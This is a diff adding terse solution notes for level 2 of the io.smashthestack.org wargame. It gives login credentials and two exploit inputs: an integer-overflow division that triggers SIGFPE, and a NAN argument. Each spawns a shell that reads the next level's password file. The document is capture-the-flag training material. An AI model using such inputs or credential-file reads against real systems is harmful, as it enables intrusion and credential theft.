@@ -1,0 +1,26 @@
+ssh level2@io.smashthestack.org
+password: hgvbmkQIHavkGg5wyk
+
+#####
+# Notes
+http://en.wikipedia.org/wiki/SIGFPE#SIGFPE
+http://en.wikipedia.org/wiki/Limits.h#limits.h
+
+man strtod
+
+#####
+# Exploit 1
+
+level2@io:/levels$ ./level02 -2147483648 -1
+source code is available in level02.c
+
+WIN!
+sh-4.2$ cat /home/level3/.pass 
+Ib3F7i7FqjziuDOBKi
+
+#####
+# Exploit 2
+
+level2@io:/levels$ ./level02_alt NAN
+sh-4.2$ cat /home/level3/.pass
+Ib3F7i7FqjziuDOBKi
